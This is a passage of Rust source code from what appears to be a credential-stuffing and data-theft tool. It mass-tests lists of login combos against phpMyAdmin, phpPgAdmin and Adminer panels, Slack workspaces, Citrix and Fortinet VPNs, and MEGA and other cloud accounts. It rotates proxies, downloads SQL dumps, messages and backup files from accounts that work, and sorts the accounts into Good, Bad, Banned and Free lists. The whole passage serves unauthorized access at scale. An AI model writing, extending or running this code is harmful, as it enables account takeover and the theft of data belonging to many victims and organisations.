                    let _ = append_good_log(&out, &target_line, &good_detail).await;
                    append_result_bucket(
                        &out,
                        &ScanResult {
                            credential: cred.clone(),
                            status: ScanStatus::Valid,
                            message: Some(good_detail.clone()),
                            databases: Vec::new(),
                        },
                    )
                    .await
                    .ok();
                    if let Some(ref callback) = cb {
                        callback(ProgressEvent::Good {
                            target: target_line.clone(),
                            detail: good_detail.clone(),
                            bytes: if download_files {
                                Some(stats.bytes)
                            } else {
                                None
                            },
                        });
                        callback(ProgressEvent::DumpComplete {
                            target: target_line.clone(),
                            files: if download_files {
                                files.len()
                            } else {
                                0
                            },
                            bytes: Some(stats.bytes),
                        });
                    } else {
                        info!("PGADMIN {} — {}", target_line, stats.detail_line());
                    }
                    // #region agent log
                    agent_log(
                        "H5",
                        "app/lib.rs:download_phppgadmin_dumps",
                        "export success kept",
                        &format!(
                            r#"{{"host":"{}","files_len":{},"bytes":{},"site_dir":"{}"}}"#,
                            json_escape(cred.url.host_str().unwrap_or("?")),
                            files.len(),
                            stats.bytes,
                            json_escape(&site_dir.display().to_string())
                        ),
                    );
                    // #endregion
                }
                Err(err) => {
                    let site_dir = cred.account_site_output_dir(&out, "phppgadmin");
                    let has_disk = site_tree_has_files(&site_dir).await;
                    // #region agent log
                    agent_log(
                        "H1",
                        "app/lib.rs:download_phppgadmin_dumps",
                        "export err",
                        &format!(
                            r#"{{"host":"{}","has_files_on_disk":{},"err":"{}","site_dir":"{}"}}"#,
                            json_escape(cred.url.host_str().unwrap_or("?")),
                            has_disk,
                            json_escape(&err.to_string().chars().take(200).collect::<String>()),
                            json_escape(&site_dir.display().to_string())
                        ),
                    );
                    // #endregion
                    if download_files && has_disk {
                        let login_at = Local::now().format("%Y-%m-%d %H:%M:%S");
                        let good_detail = format!(
                            "login ok at {login_at}; partial export kept on disk ({})",
                            err
                        );
                        let _ = append_good_log(&out, &target_line, &good_detail).await;
                        if let Some(ref callback) = cb {
                            callback(ProgressEvent::Good {
                                target: target_line.clone(),
                                detail: good_detail.clone(),
                                bytes: None,
                            });
                        }
                        return;
                    }
                    remove_site_tree_if_no_files(&site_dir).await;
                    let result = ScanResult {
                        credential: cred.clone(),
                        status: ScanStatus::Error,
                        message: Some(err.to_string()),
                        databases: Vec::new(),
                    };
                    let _ = record_mass_sql_outcome(&out, &result, &cb).await;
                }
            }
        }));
    }

    await_download_handles(handles, &cancel).await;

    if let Some(ref callback) = on_progress {
        callback(ProgressEvent::AllComplete);
    }
    info!(
        "error log: {}",
        output.join(ERROR_LOG_FILENAME).display()
    );

    Ok(())
}


pub async fn load_phpmyadmin_list_summary(path: &Path) -> Result<ParseSummary> {
    let content = read_list_file(path).await?;
    let summary = parse_credential_list_summary(&content)?;
    if summary.credentials.is_empty() {
        anyhow::bail!(
            "no valid phpMyAdmin targets in {} ({} lines checked, {} skipped)",
            path.display(),
            summary.total_lines,
            summary.skipped
        );
    }
    Ok(summary)
}

pub async fn load_phpmyadmin_list(path: &Path) -> Result<Vec<Credential>> {
    Ok(load_phpmyadmin_list_summary(path).await?.credentials)
}

pub async fn load_adminer_list_summary(path: &Path) -> Result<AdminerParseSummary> {
    let content = read_list_file(path).await?;
    let summary = parse_adminer_list_summary(&content)?;
    if summary.credentials.is_empty() {
        anyhow::bail!(
            "no valid Adminer targets in {} ({} lines checked, {} skipped, {} non-adminer urls filtered)",
            path.display(),
            summary.total_lines,
            summary.skipped,
            summary.filtered_non_adminer
        );
    }
    if summary.filtered_non_adminer > 0 {
        info!(
            "Adminer list {}: filtered {} lines without adminer in url",
            path.display(),
            summary.filtered_non_adminer
        );
    }
    Ok(summary)
}

pub async fn load_adminer_list(path: &Path) -> Result<Vec<Credential>> {
    Ok(load_adminer_list_summary(path).await?.credentials)
}

async fn download_sql_mass_exports<F, Fut>(
    creds: Vec<Credential>,
    output: PathBuf,
    threads: usize,
    download_files: bool,
    on_progress: Option<ProgressCallback>,
    cancel: Option<Arc<AtomicBool>>,
    site_kind: &'static str,
    fetch: F,
) -> Result<()>
where
    F: Fn(Credential, PathBuf, bool) -> Fut + Send + Sync + Clone + 'static,
    Fut: std::future::Future<Output = Result<(String, u64, usize)>> + Send,
{
    let error_log = init_run_output_dir_errors_only(&output).await?;
    notify_error_log(&error_log, on_progress.as_ref());
    let semaphore = Arc::new(Semaphore::new(threads.max(1)));
    let mut handles = Vec::with_capacity(creds.len());

    for cred in creds {
        if cancelled(&cancel) {
            break;
        }
        let permit = semaphore.clone().acquire_owned().await?;
        let out = output.clone();
        let cb = on_progress.clone();
        let cancel_task = cancel.clone();
        let target_line = cred.display_line();
        let fetch = fetch.clone();
        let site_kind = site_kind;
        handles.push(tokio::spawn(async move {
            let _permit = permit;
            if cancelled(&cancel_task) {
                return;
            }
            if let Some(ref callback) = cb {
                callback(ProgressEvent::DumpStarted {
                    target: target_line.clone(),
                });
            }
            match fetch(cred.clone(), out.clone(), download_files).await {
                Ok((good_detail, bytes, files_count)) => {
                    let result = ScanResult {
                        credential: cred.clone(),
                        status: ScanStatus::Valid,
                        message: Some(good_detail.clone()),
                        databases: Vec::new(),
                    };
                    emit_scan_result(&cb, &result);
                    let _ = append_good_log(&out, &target_line, &good_detail).await;
                    append_result_bucket(&out, &result).await.ok();
                    if let Some(ref callback) = cb {
                        callback(ProgressEvent::Good {
                            target: target_line.clone(),
                            detail: good_detail.clone(),
                            bytes: if download_files { Some(bytes) } else { None },
                        });
                        callback(ProgressEvent::DumpComplete {
                            target: target_line.clone(),
                            files: files_count,
                            bytes: Some(bytes),
                        });
                    } else {
                        info!("{site_kind} {target_line} — {good_detail}");
                    }
                }
                Err(err) => {
                    let site_dir = cred.account_site_output_dir(&out, site_kind);
                    remove_site_tree_if_no_files(&site_dir).await;
                    let result = ScanResult {
                        credential: cred.clone(),
                        status: ScanStatus::Error,
                        message: Some(err.to_string()),
                        databases: Vec::new(),
                    };
                    let _ = record_mass_sql_outcome(&out, &result, &cb).await;
                }
            }
        }));
    }

    await_download_handles(handles, &cancel).await;

    if let Some(ref callback) = on_progress {
        callback(ProgressEvent::AllComplete);
    }
    info!(
        "error log: {}",
        output.join(ERROR_LOG_FILENAME).display()
    );

    Ok(())
}

pub async fn download_phpmyadmin_exports(
    creds: Vec<Credential>,
    output: PathBuf,
    config: Arc<PhpMyAdminClientConfig>,
    threads: usize,
    download_files: bool,
    on_progress: Option<ProgressCallback>,
    cancel: Option<Arc<AtomicBool>>,
) -> Result<()> {
    let cfg = config.clone();
    download_sql_mass_exports(
        creds,
        output,
        threads,
        download_files,
        on_progress,
        cancel,
        "pma",
        move |cred, out, download_files| {
            let cfg = cfg.clone();
            async move {
                match download_phpmyadmin_account(&cred, &cfg, &out, download_files).await {
                    Ok((stats, files)) => {
                        let good = if download_files {
                            !files.is_empty() && stats.bytes > 0
                        } else {
                            stats.databases > 0
                        };
                        if !good {
                            let err = if download_files {
                                "phpMyAdmin: login ok but no SQL dumps saved"
                            } else {
                                "phpMyAdmin: check ok but no databases visible"
                            };
                            anyhow::bail!(err);
                        }
                        let login_at = Local::now().format("%Y-%m-%d %H:%M:%S");
                        let good_detail =
                            format!("login ok at {login_at}; {}", stats.detail_line());
                        Ok((good_detail, stats.bytes, files.len()))
                    }
                    Err(err) => Err(err),
                }
            }
        },
    )
    .await
}

pub async fn download_adminer_exports(
    creds: Vec<Credential>,
    output: PathBuf,
    config: Arc<AdminerClientConfig>,
    threads: usize,
    download_files: bool,
    on_progress: Option<ProgressCallback>,
    cancel: Option<Arc<AtomicBool>>,
) -> Result<()> {
    let cfg = config.clone();
    download_sql_mass_exports(
        creds,
        output,
        threads,
        download_files,
        on_progress,
        cancel,
        "adminer",
        move |cred, out, download_files| {
            let cfg = cfg.clone();
            async move {
                match download_adminer_account(&cred, &cfg, &out, download_files).await {
                    Ok((stats, files)) => {
                        let good = if download_files {
                            !files.is_empty() && stats.bytes > 0
                        } else {
                            stats.databases > 0
                        };
                        if !good {
                            let err = if download_files {
                                "Adminer: login ok but no SQL dumps saved"
                            } else {
                                "Adminer: check ok but no databases visible"
                            };
                            anyhow::bail!(err);
                        }
                        let login_at = Local::now().format("%Y-%m-%d %H:%M:%S");
                        let good_detail =
                            format!("login ok at {login_at}; {}", stats.detail_line());
                        Ok((good_detail, stats.bytes, files.len()))
                    }
                    Err(err) => Err(err),
                }
            }
        },
    )
    .await
}

pub async fn load_slack_list_summary(path: &Path) -> Result<SlackParseSummary> {
    let content = read_list_file(path).await?;
    let summary = parse_slack_list_summary(&content)?;
    if summary.credentials.is_empty() {
        anyhow::bail!(
            "no valid Slack targets in {} ({} lines checked, {} skipped, {} non-slack filtered)",
            path.display(),
            summary.total_lines,
            summary.skipped,
            summary.filtered_non_slack
        );
    }
    if summary.filtered_non_slack > 0 {
        info!(
            "Slack list {}: filtered {} lines where hostname does not look like Slack",
            path.display(),
            summary.filtered_non_slack
        );
    }
    Ok(summary)
}

pub async fn load_slack_list(path: &Path) -> Result<Vec<Credential>> {
    Ok(load_slack_list_summary(path).await?.credentials)
}

pub async fn download_slack_workspace_exports(
    creds: Vec<Credential>,
    output: PathBuf,
    config: Arc<SlackClientConfig>,
    threads: usize,
    download_files: bool,
    on_progress: Option<ProgressCallback>,
    cancel: Option<Arc<AtomicBool>>,
) -> Result<()> {
    let error_log = init_run_output_dir(&output).await?;
    notify_error_log(&error_log, on_progress.as_ref());
    let semaphore = Arc::new(Semaphore::new(threads.max(1)));
    let mut handles = Vec::with_capacity(creds.len());

    for cred in creds {
        if cancelled(&cancel) {
            break;
        }
        let permit = semaphore.clone().acquire_owned().await?;
        let cfg = config.clone();
        let out = output.clone();
        let cb = on_progress.clone();
        let cancel_task = cancel.clone();
        let target_line = cred.display_line();
        handles.push(tokio::spawn(async move {
            let _permit = permit;
            if cancelled(&cancel_task) {
                return;
            }
            if let Some(ref callback) = cb {
                callback(ProgressEvent::DumpStarted {
                    target: target_line.clone(),
                });
            }
            match download_slack_exports(&cred, &cfg, &out, download_files).await {
                Ok((stats, files)) => {
                    let detail = stats.detail_line();
                    let (status, message) = if download_files {
                        let has_output = !files.is_empty() || stats.files > 0 || stats.messages_exported > 0;
                        if has_output {
                            (ScanStatus::Valid, detail)
                        } else {
                            (
                                ScanStatus::Error,
                                "no Slack messages or files downloaded".to_string(),
                            )
                        }
                    } else {
                        (ScanStatus::Valid, format!("check ok — {detail}"))
                    };
                    let result = ScanResult {
                        credential: cred.clone(),
                        status,
                        message: Some(message.clone()),
                        databases: Vec::new(),
                    };
                    let _ = record_scan_result(&out, &result).await;
                    emit_scan_result(&cb, &result);
                    if let Some(ref callback) = cb {
                        if result.status == ScanStatus::Valid {
                            callback(ProgressEvent::Good {
                                target: target_line.clone(),
                                detail: message,
                                bytes: if download_files {
                                    Some(stats.bytes)
                                } else {
                                    None
                                },
                            });
                        }
                        callback(ProgressEvent::DumpComplete {
                            target: target_line.clone(),
                            files: files.len() + stats.files,
                            bytes: Some(stats.bytes),
                        });
                    } else {
                        info!("SLACK {} — {}", target_line, stats.detail_line());
                    }
                }
                Err(err) => {
                    let err_text = format!("{err:#}");
                    let result = ScanResult {
                        credential: cred.clone(),
                        status: ScanStatus::Error,
                        message: Some(err_text.clone()),
                        databases: Vec::new(),
                    };
                    let _ = record_scan_result(&out, &result).await;
                    emit_scan_result(&cb, &result);
                    if let Some(ref callback) = cb {
                        callback(ProgressEvent::DumpFailed {
                            target: target_line.clone(),
                            error: err_text,
                        });
                    } else {
                        warn!("SLACK FAIL {} — {}", target_line, err);
                    }
                }
            }
        }));
    }

    await_download_handles(handles, &cancel).await;

    if let Some(ref callback) = on_progress {
        callback(ProgressEvent::AllComplete);
    }
    info!(
        "error log: {}",
        output.join(ERROR_LOG_FILENAME).display()
    );

    Ok(())
}

pub async fn load_citrix_list_summary(path: &Path) -> Result<CitrixParseSummary> {
    let content = read_list_file(path).await?;
    let summary = parse_citrix_list_summary(&content)?;
    if summary.credentials.is_empty() {
        anyhow::bail!(
            "no Citrix VPN targets in {} ({} lines, {} skipped, {} without /vpn/ path)",
            path.display(),
            summary.total_lines,
            summary.skipped,
            summary.filtered_non_vpn
        );
    }
    Ok(summary)
}

pub async fn load_citrix_list(path: &Path) -> Result<Vec<Credential>> {
    Ok(load_citrix_list_summary(path).await?.credentials)
}

fn citrix_config_for_index(
    base: &CitrixClientConfig,
    proxy_list: Option<&Arc<Vec<String>>>,
    index: usize,
) -> Arc<CitrixClientConfig> {
    let mut cfg = base.clone();
    if let Some(list) = proxy_list {
        if !list.is_empty() {
            cfg.proxy = Some(list[index % list.len()].clone());
        }
    }
    Arc::new(cfg)
}

fn fortinet_config_for_index(
    base: &FortinetClientConfig,
    proxy_list: Option<&Arc<Vec<String>>>,
    index: usize,
) -> Arc<FortinetClientConfig> {
    let mut cfg = base.clone();
    if let Some(list) = proxy_list {
        if !list.is_empty() {
            cfg.proxy = Some(list[index % list.len()].clone());
        }
    }
    Arc::new(cfg)
}

pub async fn download_citrix_exports(
    creds: Vec<Credential>,
    output: PathBuf,
    config: Arc<CitrixClientConfig>,
    proxy_list: Option<Arc<Vec<String>>>,
    threads: usize,
    download_files: bool,
    on_progress: Option<ProgressCallback>,
    cancel: Option<Arc<AtomicBool>>,
) -> Result<()> {
    let error_log = init_run_output_dir(&output).await?;
    notify_error_log(&error_log, on_progress.as_ref());
    let semaphore = Arc::new(Semaphore::new(threads.max(1)));
    let mut handles = Vec::with_capacity(creds.len());
    let proxy_rot = Arc::new(AtomicUsize::new(0));

    for cred in creds {
        if cancelled(&cancel) {
            break;
        }
        let permit = semaphore.clone().acquire_owned().await?;
        let idx = proxy_rot.fetch_add(1, Ordering::Relaxed);
        let cfg = citrix_config_for_index(&config, proxy_list.as_ref(), idx);
        let out = output.clone();
        let cb = on_progress.clone();
        let cancel_task = cancel.clone();
        let target_line = cred.display_line();
        handles.push(tokio::spawn(async move {
            let _permit = permit;
            if cancelled(&cancel_task) {
                return;
            }
            if let Some(ref callback) = cb {
                callback(ProgressEvent::DumpStarted {
                    target: target_line.clone(),
                });
            }
            match download_citrix_account(&cred, &cfg, &out, download_files).await {
                Ok((stats, files)) => {
                    let detail = stats.detail_line();
                    let message = if download_files {
                        detail
                    } else {
                        format!("check ok — {detail}")
                    };
                    let result = ScanResult {
                        credential: cred.clone(),
                        status: ScanStatus::Valid,
                        message: Some(message.clone()),
                        databases: Vec::new(),
                    };
                    let _ = record_scan_result(&out, &result).await;
                    emit_scan_result(&cb, &result);
                    if let Some(ref callback) = cb {
                        callback(ProgressEvent::Good {
                            target: target_line.clone(),
                            detail: message,
                            bytes: None,
                        });
                        callback(ProgressEvent::DumpComplete {
                            target: target_line.clone(),
                            files: files.len(),
                            bytes: Some(stats.bytes),
                        });
                    } else {
                        info!("CITRIX {} — {}", target_line, stats.detail_line());
                    }
                }
                Err(err) => {
                    let err_text = format!("{err:#}");
                    let result = ScanResult {
                        credential: cred.clone(),
                        status: ScanStatus::Error,
                        message: Some(err_text.clone()),
                        databases: Vec::new(),
                    };
                    let _ = record_scan_result(&out, &result).await;
                    emit_scan_result(&cb, &result);
                    if let Some(ref callback) = cb {
                        callback(ProgressEvent::DumpFailed {
                            target: target_line.clone(),
                            error: err_text,
                        });
                    } else {
                        warn!("CITRIX FAIL {} — {}", target_line, err);
                    }
                }
            }
        }));
    }

    await_download_handles(handles, &cancel).await;

    if let Some(ref callback) = on_progress {
        callback(ProgressEvent::AllComplete);
    }
    info!(
        "error log: {}",
        output.join(ERROR_LOG_FILENAME).display()
    );

    Ok(())
}

pub async fn load_fortinet_list_summary(path: &Path) -> Result<FortinetParseSummary> {
    let content = read_list_file(path).await?;
    let summary = parse_fortinet_list_summary(&content)?;
    if summary.credentials.is_empty() {
        anyhow::bail!(
            "no valid Fortinet targets in {} ({} lines checked, {} skipped)",
            path.display(),
            summary.total_lines,
            summary.skipped
        );
    }
    Ok(summary)
}

pub async fn load_fortinet_list(path: &Path) -> Result<Vec<Credential>> {
    Ok(load_fortinet_list_summary(path).await?.credentials)
}

pub async fn download_fortinet_exports(
    creds: Vec<Credential>,
    output: PathBuf,
    config: Arc<FortinetClientConfig>,
    proxy_list: Option<Arc<Vec<String>>>,
    threads: usize,
    download_files: bool,
    on_progress: Option<ProgressCallback>,
    cancel: Option<Arc<AtomicBool>>,
) -> Result<()> {
    let error_log = init_run_output_dir(&output).await?;
    notify_error_log(&error_log, on_progress.as_ref());
    let semaphore = Arc::new(Semaphore::new(threads.max(1)));
    let mut handles = Vec::with_capacity(creds.len());
    let proxy_rot = Arc::new(AtomicUsize::new(0));

    for cred in creds {
        if cancelled(&cancel) {
            break;
        }
        let permit = semaphore.clone().acquire_owned().await?;
        let idx = proxy_rot.fetch_add(1, Ordering::Relaxed);
        let cfg = fortinet_config_for_index(&config, proxy_list.as_ref(), idx);
        let out = output.clone();
        let cb = on_progress.clone();
        let cancel_task = cancel.clone();
        let target_line = cred.display_line();
        handles.push(tokio::spawn(async move {
            let _permit = permit;
            if cancelled(&cancel_task) {
                return;
            }
            if let Some(ref callback) = cb {
                callback(ProgressEvent::DumpStarted {
                    target: target_line.clone(),
                });
            }
            match download_fortinet_account(&cred, &cfg, &out, download_files).await {
                Ok((stats, files)) => {
                    let detail = stats.detail_line();
                    let (status, message) = if download_files {
                        if files.is_empty() && stats.downloaded == 0 {
                            (
                                ScanStatus::Valid,
                                format!("check ok — {detail} (no backup file)"),
                            )
                        } else {
                            (ScanStatus::Valid, detail)
                        }
                    } else {
                        (ScanStatus::Valid, format!("check ok — {detail}"))
                    };
                    let result = ScanResult {
                        credential: cred.clone(),
                        status,
                        message: Some(message.clone()),
                        databases: Vec::new(),
                    };
                    let _ = record_scan_result(&out, &result).await;
                    emit_scan_result(&cb, &result);
                    if let Some(ref callback) = cb {
                        if result.status == ScanStatus::Valid {
                            callback(ProgressEvent::Good {
                                target: target_line.clone(),
                                detail: message,
                                bytes: if download_files {
                                    Some(stats.bytes)
                                } else {
                                    None
                                },
                            });
                        }
                        callback(ProgressEvent::DumpComplete {
                            target: target_line.clone(),
                            files: files.len(),
                            bytes: Some(stats.bytes),
                        });
                    } else {
                        info!("FORTINET {} — {}", target_line, stats.detail_line());
                    }
                }
                Err(err) => {
                    let err_text = format!("{err:#}");
                    let result = ScanResult {
                        credential: cred.clone(),
                        status: ScanStatus::Error,
                        message: Some(err_text.clone()),
                        databases: Vec::new(),
                    };
                    let _ = record_scan_result(&out, &result).await;
                    emit_scan_result(&cb, &result);
                    if let Some(ref callback) = cb {
                        callback(ProgressEvent::DumpFailed {
                            target: target_line.clone(),
                            error: err_text,
                        });
                    } else {
                        warn!("FORTINET FAIL {} — {}", target_line, err);
                    }
                }
            }
        }));
    }

    await_download_handles(handles, &cancel).await;

    if let Some(ref callback) = on_progress {
        callback(ProgressEvent::AllComplete);
    }
    info!(
        "error log: {}",
        output.join(ERROR_LOG_FILENAME).display()
    );

    Ok(())
}

pub async fn load_mega_list_summary(path: &Path) -> Result<MegaParseSummary> {
    let content = read_list_file(path).await?;
    let summary = parse_mega_list_summary(&content)?;
    if summary.credentials.is_empty() {
        anyhow::bail!(
            "no valid MEGA accounts in {} ({} lines checked, {} skipped)",
            path.display(),
            summary.total_lines,
            summary.skipped
        );
    }
    Ok(summary)
}

pub async fn load_mega_list(path: &Path) -> Result<Vec<Credential>> {
    Ok(load_mega_list_summary(path).await?.credentials)
}

async fn append_mega_bucket_line(dir: &Path, filename: &str, line: &str) -> Result<()> {
    use tokio::io::AsyncWriteExt;
    let path = dir.join(filename);
    let mut f = tokio::fs::OpenOptions::new()
        .create(true)
        .append(true)
        .open(&path)
        .await?;
    f.write_all(format!("{line}\n").as_bytes()).await?;
    Ok(())
}

/// Mega v4.6 run folder: `results/Good.txt`, `Bad.txt`, `Banned.txt`, `Free.txt`, `Содержимое/`.
pub async fn init_mega_v46_output_dir(dir: &Path) -> Result<PathBuf> {
    fs::create_dir_all(dir).await?;
    fs::create_dir_all(dir.join(pma_net::CONTENTS_DIR)).await?;
    let results = dir.join("results");
    fs::create_dir_all(&results).await?;
    for name in [
        "Good.txt",
        "Bad.txt",
        "Banned.txt",
        "Free.txt",
        "CantCheck.txt",
    ] {
        fs::File::create(results.join(name)).await?;
    }
    let error_log = dir.join(ERROR_LOG_FILENAME);
    let mut log = fs::File::create(&error_log).await?;
    log.write_all(
        format!(
            "# Errors.log — run started {}\n# format: [time]\\tTAG\\temail:password\\terror_detail\n",
            Local::now().format("%Y-%m-%d %H:%M:%S")
        )
        .as_bytes(),
    )
    .await?;
    log.flush().await?;
    Ok(error_log)
}

async fn record_mega_v46_result(
    dir: &Path,
    result: &ScanResult,
    free_tariff: bool,
    mega_banned: bool,
) -> Result<()> {
    let results = dir.join("results");
    let combo = result.credential.combo_line();
    if mega_banned {
        append_mega_bucket_line(&results, "Banned.txt", &combo).await?;
    } else {
        match result.status {
            ScanStatus::Valid => {
                append_mega_bucket_line(&results, "Good.txt", &combo).await?;
                if free_tariff {
                    append_mega_bucket_line(&results, "Free.txt", &combo).await?;
                }
            }
            ScanStatus::InvalidCredentials => {
                append_mega_bucket_line(&results, "Bad.txt", &combo).await?;
            }
            ScanStatus::Unreachable => {
                append_mega_bucket_line(&results, "CantCheck.txt", &combo).await?;
            }
            ScanStatus::Error | ScanStatus::Captcha | ScanStatus::NotPhpMyAdmin => {
                append_mega_bucket_line(&results, "CantCheck.txt", &combo).await?;
            }
        }
    }
    if !result.is_valid() {
        let detail = result
            .message
            .as_deref()
            .unwrap_or(result.status.label());
        let tag = classify_error_tag(result.status, result.message.as_deref());
        append_error_log_tagged(dir, tag, &combo, detail).await?;
    }
    Ok(())
}

fn mega_v46_free_quota(total_bytes: u64) -> bool {
    const FREE_CAP: u64 = 21 * 1024 * 1024 * 1024;
    total_bytes > 0 && total_bytes <= FREE_CAP
}

const CLOUD_PROXY_RETRY_ATTEMPTS: usize = 3;

async fn run_cloud_check_with_proxy_retries(
    provider: CloudProvider,
    cred: &Credential,
    base: &CloudClientConfig,
    proxies: Option<&Arc<Vec<String>>>,
    rot: &AtomicUsize,
    output_dir: &Path,
    on_check_started: Option<Arc<dyn Fn() + Send + Sync>>,
) -> Result<(CloudAccountStats, Vec<PathBuf>)> {
    let list_len = proxies.as_ref().map(|p| p.len()).unwrap_or(0);
    let tries = if list_len > 1 {
        CLOUD_PROXY_RETRY_ATTEMPTS.min(list_len)
    } else {
        1
    };
    let mut last_err: Option<anyhow::Error> = None;
    for attempt in 0..tries {
        let idx = rot.fetch_add(1, Ordering::Relaxed);
        let cfg = cloud_client_config_for_index(base, proxies, idx)?;
        let hook = if attempt == 0 {
            on_check_started.clone()
        } else {
            None
        };
        match download_cloud_account(
            provider,
            cred,
            None,
            Some(cfg.as_ref()),
            output_dir,
            false,
            hook,
        )
        .await
        {
            Ok(ok) => return Ok(ok),
            Err(err) => {
                if attempt + 1 < tries && cloud_retryable_with_other_proxy(&err) {
                    last_err = Some(err);
                    continue;
                }
                return Err(err);
            }
        }
    }
    Err(last_err.unwrap_or_else(|| anyhow::anyhow!("cloud check failed")))
}

pub async fn load_cloud_list_summary(
    path: &Path,
    provider: CloudProvider,
) -> Result<CloudParseSummary> {
    let content = fs::read_to_string(path)
        .await
        .with_context(|| format!("read {}", path.display()))?;
    parse_cloud_list_summary(provider, &content)
}

pub async fn download_cloud_exports(
    provider: CloudProvider,
    creds: Vec<Credential>,
    output: PathBuf,
    mega_config: Option<Arc<MegaClientConfig>>,
    cloud_config: Option<Arc<CloudClientConfig>>,
    proxy_list: Option<Arc<Vec<String>>>,
    threads: usize,
    upload_files: bool,
    on_progress: Option<ProgressCallback>,
    cancel: Option<Arc<AtomicBool>>,
) -> Result<()> {
    if provider == CloudProvider::Mega {
        let config = mega_config.context("MEGA HTTP config")?;
        return download_mega_exports(
            creds,
            output,
            config,
            threads,
            upload_files,
            on_progress,
            cancel,
        )
        .await;
    }
    if upload_files {
        anyhow::bail!("upload mode is only supported for MEGA.nz");
    }

    let error_log = init_mega_v46_output_dir(&output).await?;
    notify_error_log(&error_log, on_progress.as_ref());
    let error_log_lock = Arc::new(Mutex::new(()));
    let worker_count = megax_cloud_workers(threads);
    agent_log(
        "H-F",
        "app:download_cloud_exports",
        "pool config",
        &format!(
            r#"{{"provider":"{}","threads_ui":{threads},"worker_count":{worker_count},"curl_parallel":{},"creds":{}}}"#,
            provider.label(),
            megax_curl_parallel(),
            creds.len()
        ),
    );
    let proxy_rot = Arc::new(AtomicUsize::new(0));
    let (work_tx, work_rx) = mpsc::channel::<Credential>(worker_count.max(4));
    let work_rx = Arc::new(Mutex::new(work_rx));
    let mut handles = Vec::with_capacity(worker_count + 1);

    for _ in 0..worker_count {
        let rx = work_rx.clone();
        let out = output.clone();
        let cb = on_progress.clone();
        let cancel_task = cancel.clone();
        let prov = provider;
        let cfg = cloud_config.clone();
        let proxies = proxy_list.clone();
        let rot = proxy_rot.clone();
        let log_lock = error_log_lock.clone();
        handles.push(tokio::spawn(async move {
            loop {
                if cancelled(&cancel_task) {
                    break;
                }
                let cred = {
                    let mut guard = rx.lock().await;
                    guard.recv().await
                };
                let Some(cred) = cred else {
                    break;
                };
                let combo_line = cred.combo_line();
                let started_cb = cb.as_ref().map(|callback| {
                    let target = combo_line.clone();
                    let callback = Arc::clone(callback);
                    Arc::new(move || {
                        callback(ProgressEvent::DumpStarted {
                            target: target.clone(),
                        });
                    }) as Arc<dyn Fn() + Send + Sync>
                });
                let check_result = match cfg.as_deref() {
                    Some(base) => {
                        run_cloud_check_with_proxy_retries(
                            prov,
                            &cred,
                            base,
                            proxies.as_ref(),
                            &rot,
                            &out,
                            started_cb,
                        )
                        .await
                    }
                    None => {
                        download_cloud_account(
                            prov,
                            &cred,
                            None,
                            None,
                            &out,
                            false,
                            started_cb,
                        )
                        .await
                    }
                };
                let _log_guard = log_lock.lock().await;
                match check_result {
                    Ok((stats, files)) => {
                        let detail = stats.detail_line();
                        let message = format!("check ok — {detail}");
                        let result = ScanResult {
                            credential: cred.clone(),
                            status: ScanStatus::Valid,
                            message: Some(message.clone()),
                            databases: Vec::new(),
                        };
                        let _ = record_mega_v46_result(&out, &result, false, false).await;
                        emit_scan_result(&cb, &result);
                        if let Some(ref callback) = cb {
                            callback(ProgressEvent::Good {
                                target: combo_line.clone(),
                                detail: message,
                                bytes: Some(stats.cloud_bytes),
                            });
                            callback(ProgressEvent::DumpComplete {
                                target: combo_line.clone(),
                                files: files.len(),
                                bytes: Some(stats.cloud_bytes),
                            });
                        }
                    }
                    Err(err) => {
                        let err_text = format!("{err:#}");
                        let status = pma_net::scan_status_for_cloud_anyhow(&err);
                        let result = ScanResult {
                            credential: cred.clone(),
                            status,
                            message: Some(err_text.clone()),
                            databases: Vec::new(),
                        };
                        let _ = record_mega_v46_result(&out, &result, false, false).await;
                        emit_scan_result(&cb, &result);
                        if let Some(ref callback) = cb {
                            callback(ProgressEvent::DumpFailed {
                                target: combo_line.clone(),
                                error: err_text,
                            });
                        }
                    }
                }
            }
        }));
    }

    let cancel_feed = cancel.clone();
    handles.push(tokio::spawn(async move {
        for cred in creds {
            if cancelled(&cancel_feed) {
                break;
            }
            if work_tx.send(cred).await.is_err() {
                break;
            }
        }
    }));

    await_download_handles(handles, &cancel).await;
    if let Some(ref callback) = on_progress {
        callback(ProgressEvent::AllComplete);
    }
    Ok(())
}

pub async fn download_mega_exports(
    creds: Vec<Credential>,
    output: PathBuf,
    config: Arc<MegaClientConfig>,
    threads: usize,
    upload_files: bool,
    on_progress: Option<ProgressCallback>,
    cancel: Option<Arc<AtomicBool>>,
) -> Result<()> {
    let error_log = init_mega_v46_output_dir(&output).await?;
    notify_error_log(&error_log, on_progress.as_ref());

    // UI threads capped by MEGAX_CLOUD_WORKERS_MAX (default 64); curl queue by MEGAX_CURL_PARALLEL.
    let worker_count = megax_cloud_workers(threads);
    agent_log(
        "H-E",
        "app:download_mega_exports",
        "pool config",
        &format!(
            r#"{{"threads_ui":{threads},"worker_count":{worker_count},"curl_parallel":{},"creds":{}}}"#,
            megax_curl_parallel(),
            creds.len()
        ),
    );
    let (work_tx, work_rx) = mpsc::channel::<Credential>(worker_count.max(4));
    let work_rx = Arc::new(Mutex::new(work_rx));
    let mut handles = Vec::with_capacity(worker_count + 1);

    for _ in 0..worker_count {
        let rx = work_rx.clone();
        let cfg = Arc::clone(&config);
        let out = output.clone();
        let cb = on_progress.clone();
        let cancel_task = cancel.clone();
        handles.push(tokio::spawn(async move {
            loop {
                if cancelled(&cancel_task) {
                    break;
                }
                let cred = {
                    let mut guard = rx.lock().await;
                    guard.recv().await
                };
                let Some(cred) = cred else {
                    break;
                };
                let combo_line = cred.combo_line();
                let started_cb = cb.as_ref().map(|callback| {
                    let target = combo_line.clone();
                    let callback = Arc::clone(callback);
                    Arc::new(move || {
                        callback(ProgressEvent::DumpStarted {
                            target: target.clone(),
                        });
                    }) as Arc<dyn Fn() + Send + Sync>
                });
                match download_mega_account(&cred, &cfg, &out, upload_files, started_cb).await {
                    Ok((stats, files)) => {
                        let detail = stats.detail_line();
                        let message = if upload_files {
                            detail
                        } else {
                            format!("check ok — {detail}")
                        };
                        let result = ScanResult {
                            credential: cred.clone(),
                            status: ScanStatus::Valid,
                            message: Some(message.clone()),
                            databases: Vec::new(),
                        };
                        let free = mega_v46_free_quota(stats.total_bytes);
                        let _ = record_mega_v46_result(&out, &result, free, false).await;
                        emit_scan_result(&cb, &result);
                        if let Some(ref callback) = cb {
                            callback(ProgressEvent::Good {
                                target: combo_line.clone(),
                                detail: message,
                                bytes: if upload_files {
                                    Some(stats.uploaded_bytes)
                                } else {
                                    Some(stats.cloud_bytes)
                                },
                            });
                            callback(ProgressEvent::DumpComplete {
